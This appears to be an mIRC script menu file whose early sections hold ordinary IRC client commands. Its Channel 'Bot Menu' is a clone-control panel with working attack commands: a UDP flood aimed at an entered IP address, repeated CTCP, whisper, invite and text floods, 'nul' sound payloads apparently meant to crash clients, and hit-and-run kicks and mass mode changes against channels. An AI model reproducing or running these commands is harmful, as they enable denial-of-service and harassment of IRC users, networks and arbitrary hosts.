[Link]
n0=Open in browser:/url -w $$1
n1=Copy link:/clipboard $$1
n2=

[ChannelLink]
n0=Join $1:join $$1
n1=Show Users:names $$1
n2=Show Topic:topic $$1
n3=Show Mode:mode $$1
n4=

[Menubar]
n0=Commands
n1=QuitAll:/quitall
n2=Join/Part
n3=.AutoJoin Setup
n4=..Auto Join $chr(91) $key($network,auto.join) $chr(93) $+ :
n5=...Toggle ON:keywrite $network auto.join ON
n6=...Toggle OFF:keywrite $network auto.join OFF
n7=..AutoJoin Rooms
n8=...1 $chr(91) $gettok($key($network,auto.join.rooms),1,44) $chr(93) $+ :join $gettok($key($network,auto.join.rooms),1,44)
n9=...2 $chr(91) $gettok($key($network,auto.join.rooms),2,44) $chr(93) $+ :join $gettok($key($network,auto.join.rooms),2,44)
n10=...3 $chr(91) $gettok($key($network,auto.join.rooms),3,44) $chr(93) $+ :join $gettok($key($network,auto.join.rooms),3,44)
n11=...4 $chr(91) $gettok($key($network,auto.join.rooms),4,44) $chr(93) $+ :join $gettok($key($network,auto.join.rooms),4,44)
n12=..Create AutoJoin: make.auto.join
n13=..Delete AutoJoin: keywrite $network auto.join.rooms $null.Saved Nicks
n14=..Run AutoJoin:.raw join $key($network,auto.join.rooms)
n15=.Join Channel:/join #$$?="Enter channel name:"
n16=.Part All:/partall
n17=.Part Channel:/part #$$?="Enter channel name:"
n18=Clear All:/clearall
n19=Query User:/query $$?="Enter nickname and message:"
n20=Send Notice:/notice $$?="Enter nickname and message:"
n21=Whois User:/whois $$?="Enter nickname:"
n22=Send CTCP
n23=.Ping:/ctcp $$?="Enter nickname:" ping
n24=.Time:/ctcp $$?="Enter nickname:" time
n25=.Version:/ctcp $$?="Enter nickname:" version
n26=Set Away
n27=.On:/away $$?="Enter away message:"
n28=.Off:/away
n29=Invite User:/invite $$?="Enter nickname and channel:"
n30=Ban User:/ban $$?="Enter channel and nickname:"
n31=Kick User:/kick $$?="Enter channel and nickname:"
n32=Ignore User:/ignore $$?="Enter nickname:"
n33=Unignore User:/ignore -r $$?="Enter nickname:"
n34=Change Nick:/nick $$?="Enter new nickname:"
n35=Color and Display Setup
n36=.Bold Prompts $chr(91) $key(StrangeScript,sc.bold) $chr(93)
n37=..ON:keywrite StrangeScript sc.bold ON
n38=..OFF:keywrite StrangeScript sc.bold OFF
n39=.Display Color Defaults
n40=..Save Default Low Color $chr(91) %sc1 $chr(93) $+ :set %sc1 $$?="Please select from 00 - 15" | /setupshow  $+ %sc1 your color choice was this | halt
n41=..Save Default High Color $chr(91) %sc2 $chr(93) $+ :set %sc2 $$?="Please select from 00 - 15" | /setupshow  $+ %sc2 your color choice was this | halt
n42=..Save Default Bright Color $chr(91) %sc3 $chr(93) $+ :set %sc3 $$?="Please select from 00 - 15" | /setupshow  $+ %sc3 your color choice was this | halt
n43=..Save Default Message Color $chr(91) %sc4 $chr(93) $+ :set %sc4 $$?="Please select from 00 - 15" | /setupshow  $+ %sc4 your color choice was this | halt
n44=..Save Default Seperator $chr(91) %sc.seperater $chr(93) $+ :set %sc.seperater $$?="Please select from 00 - 15" | setupshow  $+ %sc.seperater your color choice was this | halt
n45=Quit IRC:/quit
n46=

[Query]
n0=$iif($menutype == Notify,Query,):/query $$1
n1=Info
n2=.Whois:whois $$1 $1
n3=.Who:who $$1
n4=.Whowas:whowas $$1
n5=CTCP
n6=.Version:ctcp $$1 version
n7=.Ping:ctcp $$1 ping
n8=.Time:ctcp $$1 time
n9=Ignore
n10=.Ignore:ignore $$1
n11=.Unignore:ignore -r $$1
n12=Invite
n13=.$submenu($invitemenu($1, $nick))
n14=DCC
n15=.Send:dcc send $$1
n16=.Chat:dcc chat $$1
n17=System Info
n18=.System:sysinfo
n19=.Operating System:osinfo
n20=.Processor(s):cpuinfo
n21=.Memory:meminfo
n22=.Graphics:gfxinfo
n23=.Harddisks:diskinfo
n24=.Audio:audioinfo
n25=.Bandwidth:bw
n26=.Uptime:uptime
n27=$iif($song,Now Playing):np
n28=-
n29=Encoding
n30=.$submenu($encodingmenu($1),25)
n31=$iif($isfile($qt($window($active).logfile)), View Log):logview $qt($window($active).logfile)
n32=-
n33=Clear:clear
n34=Search:search
n35=Close:close
n36=

[Status]
n0=QuitAll:/quitall
n1=$network Settings
n2=.Lag Check Settings
n3=..Toggle LagCheck $chr(91) $key($network,Lagchk) $chr(93) $+ :
n4=...ON:Lagon
n5=...OFF:Lagoff
n6=..LagSet Secs $chr(91) $key($network,Lagmrcsecs) $chr(93) $+ :LagSet.Secs
n7=.CTCP Ignore $chr(91) $key($network,ctcp.ignore) $chr(93) $+ :
n8=..ON:/ctcp.ignore ON
n9=..OFF:/ctcp.ignore OFF
n10=.AutoJoin Setup
n11=..Auto Join $chr(91) $key($network,auto.join) $chr(93) $+ :
n12=...Toggle ON:keywrite $network auto.join ON
n13=...Toggle OFF:keywrite $network auto.join OFF
n14=..AutoJoin Rooms:
n15=...1 $chr(91) $gettok($key($network,auto.join.rooms),1,44) $chr(93) $+ :join $gettok($key($network,auto.join.rooms),1,44)
n16=...2 $chr(91) $gettok($key($network,auto.join.rooms),2,44) $chr(93) $+ :join $gettok($key($network,auto.join.rooms),2,44)
n17=...3 $chr(91) $gettok($key($network,auto.join.rooms),3,44) $chr(93) $+ :join $gettok($key($network,auto.join.rooms),3,44)
n18=...4 $chr(91) $gettok($key($network,auto.join.rooms),4,44) $chr(93) $+ :join $gettok($key($network,auto.join.rooms),4,44)
n19=...5 $chr(91) $gettok($key($network,auto.join.rooms),5,44) $chr(93) $+ :join $gettok($key($network,auto.join.rooms),5,44) 
n20=..Create AutoJoin: make.auto.join
n21=..Delete AutoJoin:{ keywrite $network auto.join.rooms "" }
n22=..Run AutoJoin:.raw join $key($network,auto.join.rooms)
n23=.Saved Nicks
n24=..$chr(91) $key($network,saved.nick.1) $chr(93) $+ :
n25=...Use:/nick $key($network,saved.nick.1)
n26=...Edit: keyedit $network saved.nick.1 "Saved nick 1"
n27=..$chr(91) $key($network,saved.nick.2) $chr(93) $+ :
n28=...Use:/nick $key($network,saved.nick.2)
n29=...Edit: keyedit $network saved.nick.2 "Saved nick 2"
n30=MOTD:motd
n31=Time:time
n32=-
n33=$iif($server,Disconnect):disconnect
n34=Channel List:list
n35=-
n36=Encoding
n37=.$submenu($encodingmenu($1), 25)
n38=..$iif($isfile($qt($window($active).logfile)), View Log):logview $qt($window($active).logfile)
n39=-
n40=Clear
n41=.Clear:clear
n42=.Clear All:clearall
n43=Search:search
n44=Close:close
n45=

[Channel]
n0=Bot Menu
n1=.Remote Script Control
n2=..Toggle RC SEND $chr(91) %spy.value $chr(93)
n3=...ON:set %spy.trigger 1 | set %spy.value This needs to say something.
n4=...OFF:set %spy.trigger 0
n5=..Toggle RC GET $chr(91) no value $chr(93)
n6=...ON:masterwrite settings remotecontrol.get ON | .load -rs $mircdirsystem\link.ini | setupshow MultiLink Get master(settings,remotecontrol.get)
n7=...OFF:masterwrite settings remotecontrol.get OFF | .unload -rs $mircdirsystem\link.ini | /setupshow MultiLink Get master(settings,remotecontrol.get)
n8=..Secret MultiLink Password $chr(91) master(settings,secret.pass) $chr(93)
n9=...Set New Password:{ masterwrite settings secret.pass $input(Enter your MultiLink Password,egi,StrangeScript needs input) | setupshow Secret MultiLink Password set to master(settings,secret.pass) }
n10=...Clear RC Password:{ masterwrite settings secret.pass "" | setupshow Secret Password Cleared }
n11=..-
n12=..Remote Control Send Nicks
n13=...Clear All:/RC.Clear
n14=...-
n15=...Remote Control 1 $chr(91) $+ $chr(160) $+ %remote.control0 $+ $chr(160) $+ $chr(93)
n16=....Set RC nick 1 to $snick(#,1) $+ : set %remote.control0 $snick(#,1) | /setupshow RC nick 1 is $snick(#,1)
n17=....Set RC nick 1 to ?: set %remote.control0 $$?="Nick to RC" | /setupshow RC nick 1 is %remote.control0
n18=....Clear RC nick: unset %remote.control0 | /setupshow RC nick 1 cleared
n19=...Remote Control 2 $chr(91) $+ $chr(160) $+ %remote.control1 $+ $chr(160) $+ $chr(93)
n20=....Set RC nick 2 to $snick(#,1) $+ : set %remote.control1 $snick(#,1) | /setupshow RC nick 2 is $snick(#,1)
n21=....Set RC nick 2 to ?: set %remote.control1 $$?="Nick to RC" | /setupshow RC nick 2 is %remote.control1
n22=....Clear RC nick 2: unset %remote.control1 | /setupshow RC nick 2 cleared
n23=...Remote Control 3 $chr(91) $+ $chr(160) $+ %remote.control2 $+ $chr(160) $+ $chr(93)
n24=....Set RC nick 3 to $snick(#,1) $+ : set %remote.control2 $snick(#,1) | /setupshow RC nick 3 is $snick(#,1)
n25=....Set RC nick 3 to ?: set %remote.control2 $$?="Nick to RC" | /setupshow RC nick 3 is %remote.control2
n26=....Clear RC nick 3: unset %remote.control2 | /setupshow RC nick 3 cleared
n27=...Remote Control 4 $chr(91) $+ $chr(160) $+ %remote.control3 $+ $chr(160) $+ $chr(93)
n28=....Set RC nick 4 to $snick(#,1) $+ : set %remote.control3 $snick(#,1) | /setupshow RC nick 4 is $snick(#,1)
n29=....Set RC nick 4 to ?: set %remote.control3 $$?="Nick to RC" | /setupshow RC nick 4 is %remote.control3
n30=....Clear RC nick 4: unset %remote.control3 | /setupshow RC nick 4 cleared
n31=...Remote Control 5 $chr(91) $+ $chr(160) $+ %remote.control4 $+ $chr(160) $+ $chr(93)
n32=....Set RC nick 5 to $snick(#,1) $+ : set %remote.control4 $snick(#,1) | /setupshow RC nick 5 is $snick(#,1)
n33=....Set RC nick 5 to ?: set %remote.control4 $$?="Nick to RC" | /setupshow RC nick 5 is %remote.control4
n34=....Clear RC nick 5: unset %remote.control4 | /setupshow RC nick 5 cleared
n35=...Remote Control 6 $chr(91) $+ $chr(160) $+ %remote.control5 $+ $chr(160) $+ $chr(93)
n36=....Set RC nick 6 to $snick(#,1) $+ : set %remote.control5 $snick(#,1) | /setupshow RC nick 6 is $snick(#,1)
n37=....Set RC nick 6 to ?: set %remote.control5 $$?="Nick to RC" | /setupshow RC nick 6 is %remote.control5
n38=....Clear RC nick 6: unset %remote.control5 | /setupshow RC nick 6 cleared
n39=...Remote Control 7 $chr(91) $+ $chr(160) $+ %remote.control6 $+ $chr(160) $+ $chr(93)
n40=....Set RC nick 7 to $snick(#,1) $+ : set %remote.control6 $snick(#,1) | /setupshow RC nick 7 is $snick(#,1)
n41=....Set RC nick 7 to ?: set %remote.control6 $$?="Nick to RC" | /setupshow RC nick 7 is %remote.control6
n42=....Clear RC nick 7: unset %remote.control6 | /setupshow RC nick 7 cleared
n43=...Remote Control 8 $chr(91) $+ $chr(160) $+ %remote.control6 $+ $chr(160) $+ $chr(93)
n44=....Set RC nick 8 to $snick(#,1) $+ : set %remote.control7 $snick(#,1) | /setupshow RC nick 8 is $snick(#,1)
n45=....Set RC nick 8 to ?: set %remote.control7 $$?="Nick to RC" | /setupshow RC nick 8 is %remote.control7
n46=....Clear RC nick 8: unset %remote.control7 | /setupshow RC nick 8 cleared
n47=...Remote Control 9 $chr(91) $+ $chr(160) $+ %remote.control8 $+ $chr(160) $+ $chr(93)
n48=....Set RC nick 9 to $snick(#,1) $+ : set %remote.control8 $snick(#,1) | /setupshow RC nick 9 is $snick(#,1)
n49=....Set RC nick 9 to ?: set %remote.control8 $$?="Nick to RC" | /setupshow RC nick 9 is %remote.control8
n50=....Clear RC nick 9: unset %remote.control8 | /setupshow RC nick 9 cleared
n51=...Remote Control 10 $chr(91) $+ $chr(160) $+ %remote.control9 $+ $chr(160) $+ $chr(93)
n52=....Set RC nick 10 to $snick(#,1) $+ : set %remote.control9 $snick(#,1) | /setupshow RC nick 10 is $snick(#,1)
n53=....Set RC nick 10 to ?: set %remote.control9 $$?="Nick to RC" | /setupshow RC nick 10 is %remote.control9
n54=....Clear RC nick 10: unset %remote.control9 | /setupshow RC nick 10 cleared
n55=..-
n56=..Link to Local Server:dcc chat cos.selfip.biz
n57=..Send ircx:{
n58=  if (master(settings,remotecontrol.send) == ON) {
n59=    var %xXx = 0
n60=    while (%xXx <= 9) {
n61=      if (%remote.control [ $+ [ %xXx ] ] != $null) { msg $chr(61) $+ %remote.control [ $+ [ %xXx ] ] .sw ircx }
n62=      inc %xXx
n63=      if (%xXx > 9) { break }
n64=    } 
n65=  }
n66=}
n67=.-
n68=.Socket Commands
n69=..Send any command:/sw ALL $$?="Command to send"
n70=..-
n71=..Join/Part
n72=... Join ?:{ var %tmp $$?="Channel to join"  | /sw ALL join %tmp $key(%tmp,ownerkey) }
n73=...Join # $+ :{ /sw ALL join # $key(#,ownerkey) }
n74=...-
n75=...Part ?:{ /sw ALL part $$?="Enter The Channel To Part" }
n76=...Part # $+ :{ /sw ALL part # }
n77=...-
n78=...Cycle ?:{ var %tmp $$?="Enter The Channel To Cycle In" |  /sw all part %tmp | /sw all join %tmp $key(%tmp,ownerkey) }
n79=...Cycle # $+ :{ /sw ALL part # | /sw ALL join # $key(#,ownerkey) }
n80=..-
n81=..Flood Menu
n82=...-
n83=...Split ON:timerSPLITFLOOD 0 5 /Split.flood #
n84=...Split OFF:timerSPLITFLOOD OFF
n85=...-
n86=...UDP Boom Flood
n87=....ON:timerUDP -m 0 400 udp.flood $$?="IP to flood"
n88=....OFF:timerUDP off
n89=...-
n90=...Op Tease $snick(#,1) $+ :{ set %beg.sock $$?="Number of times" | /timer %beg.sock 1 beg.sock $snick(#,1) | unset %beg.sock }
n91=...Any Ctcp Flood
n92=....Ctcp flood # $+ : { var %tmp.fld = $$?="What to insert. <ctcp> <message>" | sw ALL privmsg # : $+ $chr(1) $+ %tmp.fld $+ $chr(1) | sw ALL privmsg # : $+ $chr(1) $+ %tmp.fld $+ $chr(1) | sw ALL privmsg # : $+ $chr(1) $+ %tmp.fld $+ $chr(1) | sw ALL privmsg # : $+ $chr(1) $+ %tmp.fld $+ $chr(1) | sw ALL privmsg # : $+ $chr(1) $+ %tmp.fld $+ $chr(1) | sw ALL privmsg # : $+ $chr(1) $+ %tmp.fld $+ $chr(1) }
n93=....Ctcp flood $snick(#,1) $+ : { var %tmp.fld = $$?="What to insert. <ctcp> <message>" | sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ %tmp.fld $+ $chr(1) | sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ %tmp.fld $+ $chr(1) | sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ %tmp.fld $+ $chr(1) | sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ %tmp.fld $+ $chr(1) | sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ %tmp.fld $+ $chr(1) | sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ %tmp.fld $+ $chr(1) }
n94=....Ctcp flood ALL selected: { var %tmp.fld = $$?="What to insert. <ctcp> <message>" | sw ALL privmsg $snicks : $+ $chr(1) $+ %tmp.fld $+ $chr(1) | sw ALL privmsg $snicks : $+ $chr(1) $+ %tmp.fld $+ $chr(1) | sw ALL privmsg $snicks : $+ $chr(1) $+ %tmp.fld $+ $chr(1) | sw ALL privmsg $snicks : $+ $chr(1) $+ %tmp.fld $+ $chr(1) | sw ALL privmsg $snicks : $+ $chr(1) $+ %tmp.fld $+ $chr(1) | sw ALL privmsg $snicks : $+ $chr(1) $+ %tmp.fld $+ $chr(1) }
n95=....Ctcp ?: { var %tmp = $$?="Nick to flood" | var %tmp.fld = $$?="What to insert. <ctcp> <message>" | sw ALL privmsg %tmp : $+ $chr(1) $+ %tmp.fld $+ $chr(1) | sw ALL privmsg %tmp : $+ $chr(1) $+ %tmp.fld $+ $chr(1) | sw ALL privmsg %tmp : $+ $chr(1) $+ %tmp.fld $+ $chr(1) | sw ALL privmsg %tmp : $+ $chr(1) $+ %tmp.fld $+ $chr(1) | sw ALL privmsg %tmp : $+ $chr(1) $+ %tmp.fld $+ $chr(1) | sw ALL privmsg %tmp : $+ $chr(1) $+ %tmp.fld $+ $chr(1) }
n96=...Whisper Flood
n97=....Flood $snick(#,1) $+ :{ /timerSFlD 0 5 /sw ALL privmsg $snick(#,1) : $+ 00#01#02#03#04#05#06#07#08#09#10#11#12#13#14#15#00#01#02#03#04#05#06#07#08#09#10#11#12#13#14#15#00#01#02#03#04#05#06#07#08#09#10#11#12#13#14#15#00#01#02#03#04#05#06#07#08#09#10#11#12#13#14#15#00#01#02#03#04#05#06#07#08#09#10#11#12#13#14#15#00#01#02#03#04#05#06#07#08#09#10#11#12#13#14#15#00#01#02#03#04#05#06#07#08#09#10#11#12#13#14#15#00#01#02#03#04#05#06#07#08#09#10#11#12#13#14#15# }
n98=....Flood ?:{ var %tmp.fld = $$?="Nick To Flood" | /timerSFlD 0 5 /sw ALL privmsg %tmp.fld : $+ 00#01#02#03#04#05#06#07#08#09#10#11#12#13#14#15#00#01#02#03#04#05#06#07#08#09#10#11#12#13#14#15#00#01#02#03#04#05#06#07#08#09#10#11#12#13#14#15#00#01#02#03#04#05#06#07#08#09#10#11#12#13#14#15#00#01#02#03#04#05#06#07#08#09#10#11#12#13#14#15#00#01#02#03#04#05#06#07#08#09#10#11#12#13#14#15#00#01#02#03#04#05#06#07#08#09#10#11#12#13#14#15#00#01#02#03#04#05#06#07#08#09#10#11#12#13#14#15# }
n99=....OFF:/timersfld off
n100=...Invite Flood
n101=....Flood $snick(#,1) $+ :{ /timerIFlD 0 5 /sw ALL invite $snick(#,1) $$?="Channel To invite them too" }
n102=....Flood ?:{ var %tmp.fld = $$?="Nick To Flood" | /timerIFlD 0 5 /sw ALL invite %tmp.fld $$?="Channel To invite them too" }
n103=....OFF:/timerIFlD off
n104=...Text Flood
n105=....ON:cyc
n106=....OFF:cyc off
n107=...-
n108=...Nul Options
n109=....Nul # $+ : { sw ALL privmsg # : $+ $chr(1) $+ SOUND /nul/nul.wav $+ $chr(1) }
n110=....Nul $snick(#,1) $+ : { sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ SOUND /nul/nul.wav $+ $chr(1) }
n111=....Nul ALL selected: { sw ALL privmsg $snicks : $+ $chr(1) $+ SOUND /nul/nul.wav $+ $chr(1) }
n112=....Nul ?: { var %tmp = $$?="Nick to flood" | sw ALL privmsg %tmp : $+ $chr(1) $+ SOUND /nul/nul.wav $+ $chr(1) }
n113=...Version Options
n114=....Version flood # $+ : { sw ALL privmsg # : $+ $chr(1) $+ VERSION $+ $chr(1) | sw ALL privmsg # : $+ $chr(1) $+ VERSION $+ $chr(1) | sw ALL privmsg # : $+ $chr(1) $+ VERSION $+ $chr(1) | sw ALL privmsg # : $+ $chr(1) $+ VERSION $+ $chr(1) | sw ALL privmsg # : $+ $chr(1) $+ VERSION $+ $chr(1) | sw ALL privmsg # : $+ $chr(1) $+ VERSION $+ $chr(1) }
n115=....Version flood $snick(#,1) $+ : { sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ VERSION $+ $chr(1) | sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ VERSION $+ $chr(1) | sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ VERSION $+ $chr(1) | sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ VERSION $+ $chr(1) | sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ VERSION $+ $chr(1) | sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ VERSION $+ $chr(1) }
n116=....Version flood ALL selected: { sw ALL privmsg $snicks : $+ $chr(1) $+ VERSION $+ $chr(1) | sw ALL privmsg $snicks : $+ $chr(1) $+ VERSION $+ $chr(1) | sw ALL privmsg $snicks : $+ $chr(1) $+ VERSION $+ $chr(1) | sw ALL privmsg $snicks : $+ $chr(1) $+ VERSION $+ $chr(1) | sw ALL privmsg $snicks : $+ $chr(1) $+ VERSION $+ $chr(1) | sw ALL privmsg $snicks : $+ $chr(1) $+ VERSION $+ $chr(1) }
n117=....Version flood ?: { var %tmp = $$?="Nick to flood" | sw ALL privmsg %tmp : $+ $chr(1) $+ VERSION $+ $chr(1) | sw ALL privmsg %tmp : $+ $chr(1) $+ VERSION $+ $chr(1) | sw ALL privmsg %tmp : $+ $chr(1) $+ VERSION $+ $chr(1) | sw ALL privmsg %tmp : $+ $chr(1) $+ VERSION $+ $chr(1) | sw ALL privmsg %tmp : $+ $chr(1) $+ VERSION $+ $chr(1) | sw ALL privmsg %tmp : $+ $chr(1) $+ VERSION $+ $chr(1) }
n118=...Ping Options
n119=....Ping flood # $+ : { sw ALL privmsg # : $+ $chr(1) $+ PING $+ $chr(1) | sw ALL privmsg # : $+ $chr(1) $+ PING $+ $chr(1) | sw ALL privmsg # : $+ $chr(1) $+ PING $+ $chr(1) | sw ALL privmsg # : $+ $chr(1) $+ PING $+ $chr(1) | sw ALL privmsg # : $+ $chr(1) $+ PING $+ $chr(1) | sw ALL privmsg # : $+ $chr(1) $+ PING $+ $chr(1) }
n120=....Ping flood $snick(#,1) $+ : { sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ PING $+ $chr(1) | sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ PING $+ $chr(1) | sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ PING $+ $chr(1) | sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ PING $+ $chr(1) | sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ PING $+ $chr(1) | sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ PING $+ $chr(1) }
n121=....Ping flood ALL selected: { sw ALL privmsg $snicks : $+ $chr(1) $+ PING $+ $chr(1) | sw ALL privmsg $snicks : $+ $chr(1) $+ PING $+ $chr(1) | sw ALL privmsg $snicks : $+ $chr(1) $+ PING $+ $chr(1) | sw ALL privmsg $snicks : $+ $chr(1) $+ PING $+ $chr(1) | sw ALL privmsg $snicks : $+ $chr(1) $+ PING $+ $chr(1) | sw ALL privmsg $snicks : $+ $chr(1) $+ PING $+ $chr(1) }
n122=....Ping flood ?: { var %tmp = $$?="Nick to flood" | sw ALL privmsg %tmp : $+ $chr(1) $+ PING $+ $chr(1) | sw ALL privmsg %tmp : $+ $chr(1) $+ PING $+ $chr(1) | sw ALL privmsg %tmp : $+ $chr(1) $+ PING $+ $chr(1) | sw ALL privmsg %tmp : $+ $chr(1) $+ PING $+ $chr(1) | sw ALL privmsg %tmp : $+ $chr(1) $+ PING $+ $chr(1) | sw ALL privmsg %tmp : $+ $chr(1) $+ PING $+ $chr(1) }
n123=...ClientInfo Options
n124=....ClientInfo flood # $+ : { sw ALL privmsg # : $+ $chr(1) $+ CLIENTINFO $+ $chr(1) | sw ALL privmsg # : $+ $chr(1) $+ CLIENTINFO $+ $chr(1) | sw ALL privmsg # : $+ $chr(1) $+ CLIENTINFO $+ $chr(1) | sw ALL privmsg # : $+ $chr(1) $+ CLIENTINFO $+ $chr(1) | sw ALL privmsg # : $+ $chr(1) $+ CLIENTINFO $+ $chr(1) | sw ALL privmsg # : $+ $chr(1) $+ CLIENTINFO $+ $chr(1) }
n125=....ClientInfo flood $snick(#,1) $+ : { sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ CLIENTINFO $+ $chr(1) | sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ CLIENTINFO $+ $chr(1) | sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ CLIENTINFO $+ $chr(1) | sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ CLIENTINFO $+ $chr(1) | sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ CLIENTINFO $+ $chr(1) | sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ CLIENTINFO $+ $chr(1) }
n126=....ClientInfo flood ALL selected: { sw ALL privmsg $snicks : $+ $chr(1) $+ CLIENTINFO $+ $chr(1) | sw ALL privmsg $snicks : $+ $chr(1) $+ CLIENTINFO $+ $chr(1) | sw ALL privmsg $snicks : $+ $chr(1) $+ CLIENTINFO $+ $chr(1) | sw ALL privmsg $snicks : $+ $chr(1) $+ CLIENTINFO $+ $chr(1) | sw ALL privmsg $snicks : $+ $chr(1) $+ CLIENTINFO $+ $chr(1) | sw ALL privmsg $snicks : $+ $chr(1) $+ CLIENTINFO $+ $chr(1) }
n127=....ClientInfo flood ?: { var %tmp = $$?="Nick to flood" | sw ALL privmsg %tmp : $+ $chr(1) $+ CLIENTINFO $+ $chr(1) | sw ALL privmsg %tmp : $+ $chr(1) $+ CLIENTINFO $+ $chr(1) | sw ALL privmsg %tmp : $+ $chr(1) $+ CLIENTINFO $+ $chr(1) | sw ALL privmsg %tmp : $+ $chr(1) $+ CLIENTINFO $+ $chr(1) | sw ALL privmsg %tmp : $+ $chr(1) $+ CLIENTINFO $+ $chr(1) | sw ALL privmsg %tmp : $+ $chr(1) $+ CLIENTINFO $+ $chr(1) }
n128=...Time Options
n129=....Time flood # $+ : { sw ALL privmsg # : $+ $chr(1) $+ TIME $+ $chr(1) | sw ALL privmsg # : $+ $chr(1) $+ TIME $+ $chr(1) | sw ALL privmsg # : $+ $chr(1) $+ TIME $+ $chr(1) | sw ALL privmsg # : $+ $chr(1) $+ TIME $+ $chr(1) | sw ALL privmsg # : $+ $chr(1) $+ TIME $+ $chr(1) | sw ALL privmsg # : $+ $chr(1) $+ TIME $+ $chr(1) }
n130=....Time flood $snick(#,1) $+ : { sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ TIME $+ $chr(1) | sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ TIME $+ $chr(1) | sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ TIME $+ $chr(1) | sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ TIME $+ $chr(1) | sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ TIME $+ $chr(1) | sw ALL privmsg $snick(#,1) : $+ $chr(1) $+ TIME $+ $chr(1) }
n131=....Time flood ALL selected: { sw ALL privmsg $snicks : $+ $chr(1) $+ TIME $+ $chr(1) | sw ALL privmsg $snicks : $+ $chr(1) $+ TIME $+ $chr(1) | sw ALL privmsg $snicks : $+ $chr(1) $+ TIME $+ $chr(1) | sw ALL privmsg $snicks : $+ $chr(1) $+ TIME $+ $chr(1) | sw ALL privmsg $snicks : $+ $chr(1) $+ TIME $+ $chr(1) | sw ALL privmsg $snicks : $+ $chr(1) $+ TIME $+ $chr(1) }
n132=....Time flood ?: { var %tmp = $$?="Nick to flood" | sw ALL privmsg %tmp : $+ $chr(1) $+ TIME $+ $chr(1) | sw ALL privmsg %tmp : $+ $chr(1) $+ TIME $+ $chr(1) | sw ALL privmsg %tmp : $+ $chr(1) $+ TIME $+ $chr(1) | sw ALL privmsg %tmp : $+ $chr(1) $+ TIME $+ $chr(1) | sw ALL privmsg %tmp : $+ $chr(1) $+ TIME $+ $chr(1) | sw ALL privmsg %tmp : $+ $chr(1) $+ TIME $+ $chr(1) }
n133=..-
n134=..Drive-By Menu
n135=...Flying Kick ?:{ var %tmp = $$?="Enter Channel" | var %tmp1 = $$?="Enter User to Fly In" | /sw all join %tmp $key(%tmp,ownerkey) | /sw ALL kick %tmp %tmp1 | /sw ALL part %tmp }
n136=...Flying Kick in # to $snick(#,1) $+ :{ /sw all join # $key(#,ownerkey) | /sw all kick # $snick(#,1) | /sw all part # }
n137=...-
n138=...Flying Q Boss in # $+ :{ /sw all join # $key(#,ownerkey) | /sw all mode # +q $key(settings,boss) | /sw all part # }
n139=...Flying Q in # to $snick(#,1) $+ :{ /sw all join # $key(#,ownerkey) | /sw all mode # +q $snick(#,1) | /sw all part # }
n140=...Flying Qs in # to $snick(#,1) $+ :{ /sw all join # $key(#,ownerkey) | /sw all mode # +q+q+q+q+q+q  $snick(#,1) $snick(#,1) $snick(#,1) $snick(#,1) $snick(#,1) $snick(#,1) | /sw all part # }
n141=...-
n142=...Flying Op in # to $snick(#,1) $+ :{ /sw all join # $key(#,ownerkey) | /sw all mode # +o $snick(#,1) | /sw all part # }
n143=...Flying Ops in # to $snick(#,1) $+ :{ /sw all join # $key(#,ownerkey) | /sw all mode # +o+o+o+o+o+o  $snick(#,1) $snick(#,1) $snick(#,1) $snick(#,1) $snick(#,1) $snick(#,1) | /sw all part # }
n144=...Flying DeOp in # to $snick(#,1) $+ :{ /sw all join # $key(#,ownerkey) | /sw all mode # -o $snick(#,1) | /sw all part # }
n145=...Flying DeOps in # to $snick(#,1) $+ :{ /sw all join # $key(#,ownerkey) | /sw all mode # -o-o-o-o-o-o $snick(#,1) $snick(#,1) $snick(#,1) $snick(#,1) $snick(#,1) $snick(#,1) | /sw all part # }
n146=...-
n147=...Flying Nul # $+ :{ var %tmp = $chr(1) $+ SOUND /nul/nul.wav $+ $chr(1) | /sw ALL join # $key(#,ownerkey) | /sw ALL privmsg # : $+ $replace(%tmp,$chr(160),$chr(32)) | /sw ALL part  # }
n148=...Flying Nul ?:{ var %tmp = $chr(1) $+ SOUND /nul/nul.wav $+ $chr(1) | var %temp.hit = $$?="Channel to hit" | /sw ALL join %temp.hit $key(%temp.hit,ownerkey) | /sw ALL privmsg %temp.hit : $+ $replace(%tmp,$chr(160),$chr(32)) | /sw ALL part %temp.hit }
n149=...Flying Bitch # $+ :{ var %tmp = $$?="Message to say" | /sw ALL join # $key(#,ownerkey) | /sw ALL privmsg # : $+ $replace(%tmp,$chr(160),$chr(32)) | /sw ALL part  # }
n150=...Flying Bitch ?:{ var %tmp = $$?="Message to say" | var %temp.hit = $$?="Channel to hit" | /sw ALL join %temp.hit $key(%temp.hit,ownerkey) | /sw ALL privmsg %temp.hit : $+ $replace(%tmp,$chr(160),$chr(32)) | /sw ALL part %temp.hit }
n151=...Flying Hit and Run # $+ :{ /sw ALL join # $key(#,ownerkey) | /sw ALL part  # }
n152=...Flying Hit and Run ?:{ set %temp.hit $$?="Channel to hit" | /sw ALL join %temp.hit $key(%temp.hit,ownerkey) | /sw ALL part %temp.hit | unset %temp.hit }
n153=..-
n154=..Mode Menu
